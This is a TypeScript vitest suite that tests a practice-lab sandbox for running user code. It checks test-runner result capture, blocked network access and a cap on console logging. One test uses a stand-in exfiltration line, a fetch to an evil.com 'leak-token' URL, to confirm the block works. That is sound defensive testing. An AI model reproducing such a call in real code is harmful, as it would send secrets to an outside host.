import { describe, it, expect } from 'vitest';

describe('Worker Protocol & Sandboxing Policy Suite (Subtasks 4.2 & 4.3)', () => {
  it('simulates worker execution sandbox with expect and test runners', () => {
    const logs: string[] = [];
    const testCases: any[] = [];

    const sandboxedConsole = {
      log: (...args: any[]) => logs.push(args.join(' ')),
    };

    const blockedNetwork = () => {
      throw new Error('SecurityError: Network access is disabled in the practice lab sandbox.');
    };

    const test = (name: string, fn: () => void) => {
      try {
        fn();
        testCases.push({ name, passed: true });
      } catch (err: any) {
        testCases.push({
          name,
          passed: false,
          message: err.message,
          expected: err.expected,
          actual: err.actual,
        });
      }
    };

    const expectMatcher = (actual: any) => ({
      toBe: (expected: any) => {
        if (!Object.is(actual, expected)) {
          const err: any = new Error(`Expected ${expected}, received ${actual}`);
          err.expected = expected;
          err.actual = actual;
          throw err;
        }
      },
    });

    const userCode = `
      function add(a, b) { return a + b; }
    `;

    const testScript = `
      test('adds two numbers correctly', () => {
        expect(add(2, 3)).toBe(5);
      });
      test('fails on wrong expectation', () => {
        expect(add(2, 3)).toBe(99);
      });
    `;

    const runner = new Function(
      'expect',
      'test',
      'console',
      'fetch',
      `
      ${userCode}
      ${testScript}
    `,
    );

    runner(expectMatcher, test, sandboxedConsole, blockedNetwork);

    expect(testCases).toHaveLength(2);
    expect(testCases[0].passed).toBe(true);
    expect(testCases[0].name).toBe('adds two numbers correctly');
    expect(testCases[1].passed).toBe(false);
    expect(testCases[1].actual).toBe(5);
    expect(testCases[1].expected).toBe(99);
  });

  it('prohibits network calls inside user script execution', () => {
    const blockedNetwork = () => {
      throw new Error('SecurityError: Network access is disabled in the practice lab sandbox.');
    };

    const runner = new Function(
      'fetch',
      `
      fetch('https://evil.com/leak-token');
    `,
    );

    expect(() => runner(blockedNetwork)).toThrow(/SecurityError: Network access is disabled/);
  });

  it('caps excessive console logging to prevent memory exhaustion', () => {
    const logs: string[] = [];
    const MAX_LOGS = 100;

    const sandboxedConsole = {
      log: (...args: any[]) => {
        if (logs.length < MAX_LOGS) {
          logs.push(args.join(' '));
        } else if (logs.length === MAX_LOGS) {
          logs.push('[Console output truncated: exceeded 100 log lines]');
        }
      },
    };

    const runner = new Function(
      'console',
      `
      for (let i = 0; i < 500; i++) {
        console.log('Spamming log line ' + i);
      }
    `,
    );

    runner(sandboxedConsole);

    // Logs should cap at 101 entries (100 logs + 1 truncation warning)
    expect(logs.length).toBe(101);
    expect(logs[100]).toContain('exceeded 100 log lines');
  });
});
